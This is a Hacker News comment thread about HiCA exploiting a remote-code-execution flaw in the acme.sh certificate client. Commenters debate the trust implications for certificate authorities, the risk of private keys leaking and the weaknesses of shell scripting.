[yjftsjthsd-h](user?id=yjftsjthsd-h) [on June 9, 2023](item?id=36265058)   | [root](#36262701) | [parent](#36264573) | [next](#36277083) [–]  I would expect python2 to only have gone away across major versions of an OS, which is about as non-disruptive as it could have been, considering. Of course, as I write this ansible is broken on one of my machines for reasons that appear to stem from a python 3.x->3.y update, so... | | --- | --- | --- | | | |  |  | [pornel](user?id=pornel) [on June 10, 2023](item?id=36266084)   | [root](#36262701) | [parent](#36265058) | [next](#36277083) [–]  That's the thing — Python can break with any OS update (I personally can break it whenever I touch it ;) OTOH a script for /bin/sh written 30 years ago has a good chance running today unchanged. Having said that, I still would not recommend shell for anything that needs to be robust and secure. | | --- | --- | --- | | | |  |  | [Bystroushaak](user?id=Bystroushaak) [on June 10, 2023](item?id=36274147)   | [root](#36262701) | [parent](#36266084) | [next](#36277083) [–]  Well. I've been using python personally since 2007, and it never broke with update (I still occasionally run scripts written for 2.5). Also, I am working as a python backend dev, dealing with hundreds of systems (we are deploying 270+ systems and supporting another 340 user built docker images built on top of py library), and no problems there either. In my previous job, I was doing deployment to 4000+ kiosk computers, and still, no problems with python breaking. What was definitely problematic was the update from 2 to 3. Another problem may be dependency management (people not pinning dependencies). But the python itself? What does it even mean? Interpreter not starting? | | --- | --- | --- | | | |  |  | [cozzyd](user?id=cozzyd) [on June 11, 2023](item?id=36276909)   | [root](#36262701) | [parent](#36274147) | [next](#36277083) [–]  If you're using Python as a bash script replacement for various individual standalone scripts, typically you would be using system libraries without pinning dependencies, in which case you'll break on various OS updates as Python libraries don't seem to value backwards compatibility. Sure you could include a virtual environment with every script but that's not very ergonomic and will really add up... | | --- | --- | --- | | | |  |  | [Bystroushaak](user?id=Bystroushaak) [on June 12, 2023](item?id=36291222)   | [root](#36262701) | [parent](#36276909) | [next](#36277083) [–]  I would say python's stdlib is mostly stable. Usually when I port shell scripts to python, I create a folder for it and throw in some setup.py / requirements.txt. But lately, I've automated most of the deb package creation process (<https://copier.readthedocs.io>), and I typically create the whole deb package. Of course, for single use stuff, I don't bother with either. | | --- | --- | --- | | | |  |  | [broknbottle](user?id=broknbottle) [on June 11, 2023](item?id=36277083)   | [root](#36262701) | [parent](#36263748) | [prev](#36264109) | [next](#36270494) [–]  macOS doesn’t even come with Python.. | | --- | --- | --- | | | |  |  | [monetus](user?id=monetus) [on June 10, 2023](item?id=36270494)   | [root](#36262701) | [parent](#36263249) | [prev](#36263748) | [next](#36265271) [–]  Ever tried TCL? Curious on your thoughts. | | --- | --- | --- | | | |  |  | [electroly](user?id=electroly) [on June 9, 2023](item?id=36265271)   | [parent](#36262701) | [prev](#36263249) | [next](#36266385) [–]  This is a Chinese CA, I don't think there was a danger of any of us using it, and none of them are here to receive this criticism. Most of your complaints are about the shell script that the Chinese CA is injecting and that's... not really the problem at all. It's amazing that it's not literally a rootkit; that's what I expected when they said a Chinese CA was injecting a shell script that acme.sh was running. You're missing the forest for the trees here. This doesn't get better if they had injected a better-written script or a Rust program or whatever else. They could still have injected *anything*, and *that's* the problem. The people who wrote acme.sh (different people than the Chinese CA), which has the security vulnerability that the Chinese CA exploited, might have some soul-searching to do. | | --- | --- | --- | | | |  |  | [catkitcourt](user?id=catkitcourt) [on June 10, 2023](item?id=36266385)   | [parent](#36262701) | [prev](#36265271) | [next](#36254093) [–]  I had wrote some shell software (~5k loc without comment i think?) and agree. I was using shell because the project want to maintain compatibility between different distros (including some weird customized one without `ps` and `sed`), but that's all. Shell is not a good choice for things other than scripting. | | --- | --- | --- | | | |  |  | [regecks](user?id=regecks) [on June 9, 2023](item?id=36254093)   | [prev](#36262701) | [next](#36263670) [–]  I think the title buries the most horrifying part of this. The HiCA certificate authority is relying on an RCE to do an end-run around the semantics of the ACME HTTP-01 validation method. Fucked up and they should be booted from every root program for this. | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [on June 9, 2023](item?id=36255744)   | [parent](#36254093) | [next](#36262430) [–]  They aren't in any root programs. They're just taking certificate requests and relaying them to real CAs, which is why they need to exploit an RCE in the ACME client, since the ACME client wouldn't otherwise be able to complete the validations required by the actual CA. | | --- | --- | --- | | | |  |  | [chunk\_waffle](user?id=chunk_waffle) [on June 9, 2023](item?id=36262430)   | [parent](#36254093) | [prev](#36255744) | [next](#36254281) [–]  When confronted they just flat out shut down the service. They also donated $1000 to the project, and they've redirected requests to their payment site to the US White House's website, and they're from China. They were also suggesting that user's ran the utility as root... All really shady... | | --- | --- | --- | | | |  |  | [stavros](user?id=stavros) [on June 9, 2023](item?id=36254281)   | [parent](#36254093) | [prev](#36262430) | [next](#36263670) [–]  Wow, that's... bold. | | --- | --- | --- | | | |  |  | [freedomben](user?id=freedomben) [on June 9, 2023](item?id=36263670)   | [prev](#36254093) | [next](#36255275) [–]  Major props and thanks to the HiCA person for engaging on the thread even though they were getting hammered. Yes they made some really (damn clever but) bad implementation decisions to use an RCE in the client to basically hack around the entire system, and then compounded it with other bad decisions to redirect to the US White House website to stop a DDoS, but the fact that they engaged, admitted, and explained what was going on I thought was really big of them. Everybody makes mistakes people. If this person was trying to be malicious they would have disappeared, not come straight clean about it on the thread. | | --- | --- | --- | | | |  |  | [clysm](user?id=clysm) [on June 9, 2023](item?id=36265111)   | [parent](#36263670) | [next](#36255275) [–]  But... HiCA just disappeared. Their site is gone now. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [on June 9, 2023](item?id=36255275)   | [prev](#36263670) | [next](#36262924) [–]  Looks like they are issuing under a sub-CA of "ssl.com" according to [https://github.com/acmesh-official/acme.sh/issues/4659#issue...](https://github.com/acmesh-official/acme.sh/issues/4659#issuecomment-1583611298) Interestingly, the mozilla dev-security-policy group seems to contain a recent discussion about including "ssl.com" in the root store here [https://groups.google.com/a/mozilla.org/g/dev-security-polic...](https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/VqnAop6IPcc) Curious to know if this could, maybe it should, have ripple effects to the various SSL Root CA programs. Having someone run a subCA that actually exploits an RCE against ACME clients doesn't seem very trustworthy, and any CA enabling this behaviour should probably be kicked out of the trust stores? | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [on June 9, 2023](item?id=36255748)   | [parent](#36255275) | [next](#36262924) [–]  The sub CA is operated by ssl.com, not HiCA (which is not a trusted certificate authority). HiCA is relaying the certificate requests to ssl.com, which is properly validating the requests in accordance with all the requirements. ssl.com isn't doing anything wrong. That's why HiCA needs to exploit an RCE in acme.sh - ACME doesn't support relaying certificate requests to other CAs like this. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [on June 9, 2023](item?id=36256172)   | [root](#36255275) | [parent](#36255748) | [next](#36262924) [–]  Someone posted a comment on github claiming they are the founder of Quantum (the sub CA of ssl.com - see <https://crt.sh/?caid=200960> ) and that they are the provider of the HiCA service. So it does sound like there is a closer link here than your comment would indicate: [https://github.com/acmesh-official/acme.sh/issues/4659#issue...](https://github.com/acmesh-official/acme.sh/issues/4659#issuecomment-1584414218) | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [on June 9, 2023](item?id=36256211)   | [root](#36255275) | [parent](#36256172) | [next](#36262924) [–]  Quantum is not a trusted CA. ssl.com has a white-labeled intermediate CA with the name "Quantum" in it, but this intermediate CA is operated by ssl.com under all the same controls as ssl.com's other intermediate CAs. Quantum has no ability to issue trusted certificates themselves. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [on June 9, 2023](item?id=36256252)   | [root](#36255275) | [parent](#36256211) | [next](#36262924) [–]  So the person claiming to be the founder of "QuantumCA" does not possess the private key corresponding to <https://crt.sh/?caid=200960> - can we be sure the private key is only accessible by ssl.com's CA system? So the certificates listed here aren't issued by this person, but by the ssl.com's system? [https://crt.sh/?Identity=%25&iCAID=200960&exclude=expired&de...](https://crt.sh/?Identity=%25&iCAID=200960&exclude=expired&deduplicate=Y) Also, why would ssl.com even create a subCA named "QuantumCA"? Are they in business with this person claiming to be the founder of "QuantumCA" who appears to be responsible for exploiting this acme.sh 0day? What does this say about ssl.com's trustworthiness? Or is the person in the github comments lying? | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [on June 9, 2023](item?id=36256426)   | [root](#36255275) | [parent](#36256252) | [next](#36262924) [–]  > *So the person claiming to be the founder of "QuantumCA" does not possess the private key corresponding to <https://crt.sh/?caid=200960> - can we be sure the private key is only accessible by ssl.com's CA system? So the certificates listed here aren't issued by this person, but by the ssl.com's system? <https://crt.sh/?Identity=%25&iCAID=200960&exclude=expired&de>...* Correct. You can see the Quantum intermediates listed in ssl.com's most recent audit statement, meaning an auditor has verified that ssl.com has controls to protect the private key: [https://www.cpacanada.ca/generichandlers/CPACHandler.ashx?at...](https://www.cpacanada.ca/generichandlers/CPACHandler.ashx?attachmentid=4abb6f0c-a72d-40ca-90a1-1c40b140f75a) (The audit could be flawed, but it's the same amount of assurance we have for any intermediate CA's private key - the fact that "QuantumCA" is in the name does not change the risk calculus) > *Also, why would ssl.com even create a subCA named "QuantumCA"? Are they in business with this person claiming to be the founder of "QuantumCA" who appears to be responsible for exploiting this acme.sh 0day? What does this say about ssl.com's trustworthiness? Or is the person in the github comments lying?* There is a business relationship between QuantumCA and ssl.com. QuantumCA is a reseller of ssl.com, and they've paid extra to ssl.com so that the certificates they purchase get issued from an intermediate CA named "QuantumCA" rather than one of ssl.com's usual intermediate CAs which have "ssl.com" in the name. This lets QuantumCA pretend to be a real CA. This is a common practice in the industry, and I don't think it says anything about the trustworthiness of ssl.com, because the business relationship with QuantumCA doesn't in any way subvert the integrity of the WebPKI since ssl.com retains control of the issuance. Still, I wish intermediate CA white-labeling were banned because it causes terrible confusion about who is and isn't a CA. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [on June 9, 2023](item?id=36256530)   | [root](#36255275) | [parent](#36256426) | [next](#36262924) [–]  I find it troubling that a root CA (ssl.com) is apparently OK with lending their name in a business relationship with an actor that is actively exploiting an acme.sh 0day. | | --- | --- | --- | | | |  |  | [tptacek](user?id=tptacek) [on June 9, 2023](item?id=36263142)   | [root](#36255275) | [parent](#36256530) | [next](#36262097) [–]  This feels a little bit like doubling down to find ways to implicate the actual CA instead of the reseller. It's clear how mismanagement by a real CA would make a more interesting story than by this random no-longer-existing pseudo-reseller, but I don't think there's evidence to support that story yet. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [on June 9, 2023](item?id=36263700)   | [root](#36255275) | [parent](#36263142) | [next](#36262097) [–]  But it's not a random pseudo-reseller? The one github comment from "the founder of Quantum CA" seems to say they are also the creator of HiCA, which is the entity that was exploiting the 0day in acme.sh. And the crt.sh link shows an intermediate CA cert named "QuantumCA", signed by ssl.com. So QuantumCA == HiCA == exploiters of the acme.sh 0day, it's all the same entity? The intermediate CA could just as well be named "0dayexploitersCA"? Why is it not a huge concern that ssl.com is fine with operating such a "0dayexploitersCA" intermediate? Am I missing something here? | | --- | --- | --- | | | |  |  | [zhfliz](user?id=zhfliz) [on June 11, 2023](item?id=36280503)   | [root](#36255275) | [parent](#36263700) | [next](#36262097) [–]  Quantum CA (brand, not operator)/HiCA still can't issue certs for domains they don't "control" by having RCE on the systems they point to. all CA requirements for validation still need to be fulfilled for issued certificates, as ssl.com, the Quantum CA operator, which exclusively holds the private keys, is a "proper" CA. this does not affect the trust in the CA infrastructure or ssl.com itself; while this is morally questionable to keep the business relationship, it does not mean the CA is not following the signing requirements. | | --- | --- | --- | | | |  |  | [mholt](user?id=mholt) [on June 9, 2023](item?id=36262097)   | [root](#36255275) | [parent](#36256530) | [prev](#36263142) | [next](#36262924) [–]  I honestly don't think anyone else knew about the RCE until yesterday. | | --- | --- | --- | | | |  |  | [ronsor](user?id=ronsor) [on June 9, 2023](item?id=36262924)   | [prev](#36255275) | [next](#36266254) [–]  These sorts of hacks remind me of when AOL's AIM server was exploiting bugs in their own client to run verification code[0]. Hardly an acceptable practice in 2023, though. [0] <https://www.geoffchappell.com/notes/security/aim/index.htm> | | --- | --- | --- | | | |  |  | [catkitcourt](user?id=catkitcourt) [on June 10, 2023](item?id=36266254)   | [prev](#36262924) | [next](#36262968) [–]  This raise one more issue about Chinese providers. The site using this exploit, HiCA is run by xiaohuilam on Github. He/She is also the founder of two famous SSL certificate provider in China, DigitalSign and QuantumCA. Additionally, he is also a contributor of acme.sh repository. The acme.sh repository locked issue #4659 quickly after it raise attentions in the developer community in China. It's hard to imagine that, as one of the repository's contributor, once you have found a vulnerability, you are going to use it in your own product, instead of fix it. They are just another version of Pinduoduo (owner of Temu, and also the one who put spyware on user's android phone). | | --- | --- | --- | | | |  |  | [WirelessGigabit](user?id=WirelessGigabit) [on June 9, 2023](item?id=36262968)   | [prev](#36266254) | [next](#36261493) [–]  This means that acme.sh has an RCE. Once the patch is in I'm rotating all my certs, even though I use ZeroSSL. I do wonder if what HiCA did gave possibilities to post the private key somewhere else? | | --- | --- | --- | | | |  |  | [mholt](user?id=mholt) [on June 9, 2023](item?id=36264270)   | [parent](#36262968) | [next](#36261493) [–]  If the executed script transmits the key, then yes. (But the script we observed does not.) | | --- | --- | --- | | | |  |  | [j16sdiz](user?id=j16sdiz) [on June 9, 2023](item?id=36261493)   | [prev](#36262968) | [next](#36258901) [–]  <quote> ... HiCA is injecting arbitrary code/commands into the certificate obtaining process and acme.sh is running them on the client machine. </quote> | | --- | --- | --- | | | |  |  | [Vecr](user?id=Vecr) [on June 9, 2023](item?id=36258901)   | [prev](#36261493) | [next](#36253552) [–]  Even if this is just RCE in the script somehow (I doubt it, it can probably do anything the user running it can), it's horrifying. It means the certificate authority could just take your newly generated certificates and upload them anywhere they want. That's a catastrophic compromise in the TLS security model. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [on June 9, 2023](item?id=36265258)   | [parent](#36258901) | [next](#36263054) [–]  Somebody who cares about the acme.sh client specifically would be able to say, but in general it's not necessary that your ACME client has these keys. What the ACME protocol wants to do is hand over a CSR (Certificate Signing Request), and get back a certificate, and to achieve that it has to explain how you'll prove you're entitled to such a certificate. Most ACME clients will also make a suitable proof (in at least some cases), and also generate a suitable CSR from first principles, for which they will need to generate a new private key - but that's not a necessary part of the system, and it's certainly not rare to generate your own CSR, either because you must technically, or because your own security processes say *strange women, lying in ponds, distributing swords is no basis for a system of government* sorry, I mean, that this key is private and shouldn't be on the host running ACME services. | | --- | --- | --- | | | |  |  | [Vecr](user?id=Vecr) [on June 10, 2023](item?id=36266594)   | [root](#36258901) | [parent](#36265258) | [next](#36263054) [–]  I've looked at it more, it looks like this RCE could harvest the private key. | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [on June 10, 2023](item?id=36268486)   | [root](#36258901) | [parent](#36266594) | [next](#36263054) [–]  I have no idea, my point was that in general the ACME client can't necessarily give you the private key even if it wanted to, because if you provide a CSR the key needn't even be on the same machine, let alone accessible in its execution environment. | | --- | --- | --- | | | |  |  | [diarrhea](user?id=diarrhea) [on June 9, 2023](item?id=36263054)   | [parent](#36258901) | [prev](#36265258) | [next](#36261733) [–]  Why is distributing the certificate dangerous? It’s public knowledge anyway. | | --- | --- | --- | | | |  |  | [Vecr](user?id=Vecr) [on June 9, 2023](item?id=36263469)   | [root](#36258901) | [parent](#36263054) | [next](#36261733) [–]  The private key I mean, it's really supposed to be secret on your computer and not even the certificate authority is supposed to have access to it. | | --- | --- | --- | | | |  |  | [paulgb](user?id=paulgb) [on June 9, 2023](item?id=36261733)   | [parent](#36258901) | [prev](#36263054) | [next](#36253552) [–]  If the CA is compromised, can’t they just bypass ACME verification and generate a cert for your domain anyway? | | --- | --- | --- | | | |  |  | [mholt](user?id=mholt) [on June 9, 2023](item?id=36262127)   | [root](#36258901) | [parent](#36261733) | [next](#36262252) [–]  Yes, but with serious consequences (it would go into public transparency logs, at least for CAs in most public root stores). If the CA can access your private key, then it can reuse (or worse, redistribute) it without anyone knowing. | | --- | --- | --- | | | |  |  | [dspillett](user?id=dspillett) [on June 9, 2023](item?id=36262252)   | [root](#36258901) | [parent](#36261733) | [prev](#36262127) | [next](#36262133) [–]  The CA isn't directly compromised so a third party couldn't generate any arbitrary certificate this way. Essentially though, assuming my understanding is correct, it would allow them to be a man-in-the-middle and take copies of the keys & certificates used by this tool, allowing them to use keys and certificates generated by that tool. Also, if such a tool is run by root (bad practise, but not uncommon practise) or other significantly privileged user, they potentially have access to far more. | | --- | --- | --- | | | |  |  | [Vecr](user?id=Vecr) [on June 9, 2023](item?id=36262133)   | [root](#36258901) | [parent](#36261733) | [prev](#36262252) | [next](#36253552) [–]  Yeah, but that's more likely to be noticed in cert transparency and by the website operator, as there's either a duplicate cert in the log or the website server does not work. | | --- | --- | --- | | | |  |  | [AmenBreak](user?id=AmenBreak) [on June 9, 2023](item?id=36253552)   | [prev](#36258901) [–]  Is this part of Plan 9? | | --- | --- | --- | | | |  |  | [com](user?id=com) [on June 9, 2023](item?id=36253740)   | [parent](#36253552) | [next](#36263593) [–]  Unfortunately this is related to acme.sh, a shell script tool to request new and replace free certificates. So far, this GitHub issue is quite disturbing. | | --- | --- | --- | | | |  |  | [tinus\_hn](user?id=tinus_hn) [on June 9, 2023](item?id=36253834)   | [root](#36253552) | [parent](#36253740) | [next](#36263593) [–]  IMO it’s just a demonstration why you don’t write complicated or security sensitive code in shell script: it’s basically impossible to get right, there’s pitfalls around every corner and it’s extremely difficult to check for mistakes. | | --- | --- | --- | | | |  |  | [pazderski](user?id=pazderski) [on June 9, 2023](item?id=36255296)   | [root](#36253552) | [parent](#36253834) | [next](#36263593) [–]  I wouldn't say there are too many pitfalls. Quote all variables (acme.sh seem to do well on that part) and don't use eval (probably the reason for this problem). | | --- | --- | --- | | | |  |  | [Eeems](user?id=Eeems) [on June 9, 2023](item?id=36259171)   | [root](#36253552) | [parent](#36255296) | [next](#36263593) [–]  I just read the entire issue thread, yes eval was the reason. | | --- | --- | --- | | | |  |  | [MisterTea](user?id=MisterTea) [on June 9, 2023](item?id=36263593)   | [parent](#36253552) | [prev](#36253740) [–]  No. This is not the acme editor. This is what ACME they are referring to: [https://en.wikipedia.org/wiki/Automatic\_Certificate\_Manageme...](https://en.wikipedia.org/wiki/Automatic_Certificate_Management_Environment) | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |


